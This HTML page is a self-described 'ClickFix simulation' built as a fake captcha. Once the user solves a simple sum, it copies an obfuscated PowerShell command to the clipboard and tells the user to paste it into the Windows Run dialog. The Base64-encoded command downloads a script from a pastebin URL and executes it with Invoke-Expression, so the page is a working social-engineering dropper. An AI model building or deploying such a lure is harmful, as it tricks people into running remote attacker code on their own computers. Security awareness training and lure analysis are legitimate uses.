<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Captcha → ClickFix Simulation</title>
<style>
body{
  font-family:Arial,sans-serif;
  background:#f4f6f8;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}
.box{
  width:420px;
  background:#fff;
  padding:20px;
  border-radius:10px;
  box-shadow:0 6px 16px rgba(0,0,0,.12);
}
.title{text-align:center;font-weight:bold;margin-bottom:10px;}
.question{text-align:center;font-size:18px;margin-bottom:12px;}
input{
  width:100%;
  padding:8px;
  font-size:16px;
  text-align:center;
  margin-bottom:10px;
}
button{
  width:100%;
  padding:10px;
  font-size:15px;
  border:none;
  border-radius:6px;
  background:#4caf50;
  color:#fff;
  cursor:pointer;
}
button:hover{background:#43a047;}
.success{color:#4caf50;font-weight:bold;text-align:center;margin-top:10px;}
.error{color:#e53935;text-align:center;margin-top:10px;}

.panel{
  display:none;
  margin-top:14px;
  padding:14px;
  background:#fffbe6;
  border:1px solid #f0e1a0;
  border-radius:10px;
}
.panel h3{margin:0 0 8px 0;font-size:14px;}
.steps{padding-left:18px;font-size:13px;}
.log{
  margin-top:10px;
  background:#0b1020;
  color:#e7eaff;
  padding:10px;
  border-radius:8px;
  font-family:monospace;
  font-size:12px;
  white-space:pre-wrap;
  max-height:160px;
  overflow:auto;
}
.small{font-size:12px;opacity:.85;margin-top:8px;}
</style>
</head>
<body>

<div class="box">
  <div class="title">Verify you are human</div>
  <div class="question" id="question"></div>

  <input id="answer" placeholder="Enter your answer">
  <button id="verifyBtn">Verify</button>

  <div id="result"></div>

  <div class="panel" id="panel">
    <h3>Additional verification required</h3>
    <ol class="steps">
      <li>Press <b>Win</b> + <b>R</b></li>
      <li>Press <b>Ctl</b> + <b>V</b></li>
      <li>Press <b>Enter</b></li>
    </ol>
  </div>
</div>

<script>
(function(){
  /* ==============================
     🔧 EDIT ONLY BELOW
     ============================== */

  const CLIPBOARD_PAYLOAD = `powershell.exe -EncodedCommand CgAkAHUAcgBsACAAPQAgACIAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBNAGgAcwBIAHcARAA5AHYAIgAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEMAbwBuAHQAZQBuAHQACgAgACAAIAAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAfQAKAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAIAAiAAoAfQAKAA==`;

  /* ============================== */

  const a=5,b=7,correct=a+b;
  const q=document.getElementById("question");
  const ans=document.getElementById("answer");
  const res=document.getElementById("result");
  const panel=document.getElementById("panel");
  const logEl=document.getElementById("log");

  window.captchaSolved=false;
  window.clipboardCopied=false;
  window.stage2Fetched=false;

  function log(m){
    logEl.textContent+=`[${new Date().toISOString()}] ${m}\n`;
    logEl.scrollTop=logEl.scrollHeight;
  }

  q.textContent=`Calculate ${a} + ${b}`;

  document.getElementById("verifyBtn").onclick=async()=>{
    if(parseInt(ans.value,10)===correct){
      res.innerHTML="<div class='success'>✔ Verified</div>";
      window.captchaSolved=true;
      panel.style.display="block";
      try{
        await navigator.clipboard.writeText(CLIPBOARD_PAYLOAD);
        window.clipboardCopied=true;

      }catch(e){
      }
    }else{
      res.innerHTML="<div class='error'>✖ Incorrect</div>";
      panel.style.display="none";
      window.captchaSolved=false;
    }
  };
})();
</script>

</body>
</html>
